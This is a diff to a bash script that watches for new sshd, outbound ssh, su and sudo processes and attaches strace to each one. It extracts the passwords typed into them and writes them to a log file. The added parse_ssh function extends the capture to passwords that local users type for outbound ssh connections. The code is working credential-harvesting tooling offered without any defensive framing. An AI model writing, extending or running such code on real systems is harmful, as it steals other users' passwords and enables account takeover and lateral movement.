@@ -1,7 +1,9 @@
 #!/bin/bash
 
 # Function to attach to SSH process and extract password attempts
-attach_ssh () {
+parse_sshd () {
+	PS_COMM=$( ps -p $1 -o command --no-header )
+
     # Capture the lines containing password attempts by tracing the process
     PASSWORD_LINES=$(strace -p $1 2>&1 | grep 'read(6, \"\\f')
 
@@ -15,7 +17,7 @@ attach_ssh () {
 	# Initialize a counter for password attempts
     COUNT=1
 
-	echo "Method: sshd" | tee -a $LOG_FILE
+	echo Process : "$PS_COMM" | tee -a $LOG_FILE
 
     # Print and log the username lines containing the user or IP information	
     echo "$USERNAME_LINES" | egrep --color "(user|for).(\w)*"   |tee -a $LOG_FILE
@@ -36,6 +38,49 @@ attach_ssh () {
 			COUNT=$((COUNT+1))
 		done <<< "$PASSWORD_LINES"
 	fi
+		
+    # Print a separator line for better readability in the log file	
+    echo "----------------------------------------------------" |tee -a $LOG_FILE
+}
+
+parse_ssh () {
+	PS_COMM=$( ps -p $1 -o command --no-header )
+	USER_NAME=$(ps -p $1 -o euser --noheader )
+
+	OUTPUT_LINES=$(strace -p $1 2>&1   )
+
+  
+	#PASSWORD_LINES=$(echo "$OUTPUT_LINES" | grep read\(5 |  sed s#\\\\n##g | cut -f 2 -d \")
+	PASSWORD_LINES=$(echo "$OUTPUT_LINES" | grep read\(5 | grep "\ 1$" | cut -f 2 -d \" |  tr -d '\n')
+	#PASSWORD_LINES=$(echo "$OUTPUT_LINES" | grep ^read | grep "\ 1$" | cut -f 2 -d \" | tr -d '\n')
+
+
+
+	# Extract lines containing the SSH username and port information from the auth.log file
+
+	# Initialize a counter for password attempts
+    COUNT=1
+
+
+
+	echo
+	echo Process : "$PS_COMM" | tee -a $LOG_FILE
+	echo "User: $USER_NAME" | tee -a $LOG_FILE
+	
+
+	# Loop through each line containing a password attempt
+	while IFS= read -r PLINE; do
+	
+		# Extract the password from the line and remove non-printable characters
+		PASSWORD=$(printf "$PLINE" | tr -cd '[:print:]' | cut -f 2 -d \")
+		
+		# Print and log the password attempt with the corresponding count
+		echo "Password Attempt $COUNT: \"$PASSWORD\""   | tee -a $LOG_FILE
+		
+		# Increment the counter
+		COUNT=$((COUNT+1))
+	done < <( printf "$PASSWORD_LINES" )
+
 		
     # Print a separator line for better readability in the log file	
     echo "----------------------------------------------------" |tee -a $LOG_FILE
@@ -134,23 +179,36 @@ while true; do
 	
 	recent_process_list=$(ps -eo pid,etimes,comm,command | awk '{if ($2 < 60) { print $0}}')
 	
- 
-	sshloginpids=$(echo "$recent_process_list" | grep ss[h]d.*priv | awk '{print $1}')
+	sshpids=$(echo "$recent_process_list" | awk '{if ($3 == "ssh") { print $1}}')
+	sshdpids=$(echo "$recent_process_list" | grep ss[h]d.*priv | awk '{print $1}')
+	
 	supids=$(echo "$recent_process_list" | awk '{if ($3 == "su") { print $1}}')
 	sudopids=$(echo "$recent_process_list" | awk '{if ($3 == "sudo") { print $1}}')
 
 
 	
-    if [[ ! -z $sshloginpids ]]; then
-        for pid in $sshloginpids; do
+    if [[ ! -z $sshdpids ]]; then
+        for pid in $sshdpids; do
             # Check if PID has been processed before
             if [[ " ${processed_pids[*]} " != *" $pid "* ]]; then
                 echo "Found SSHD Pid: $pid. Attaching..."
                 processed_pids+=("$pid")  # Add PID to processed_pids array
-                attach_ssh $pid &
+                parse_sshd $pid &
             fi
         done
     fi
+	
+	if [[ ! -z $sshpids ]]; then
+        for pid in $sshpids; do
+            # Check if PID has been processed before
+            if [[ " ${processed_pids[*]} " != *" $pid "* ]]; then
+                echo "Found Outbound SSH Pid: $pid. Attaching..."
+                processed_pids+=("$pid")  # Add PID to processed_pids array
+                parse_ssh $pid &
+            fi
+        done
+    fi
+	
 	
 	if [[ ! -z $supids ]]; then
         for pid in $supids; do
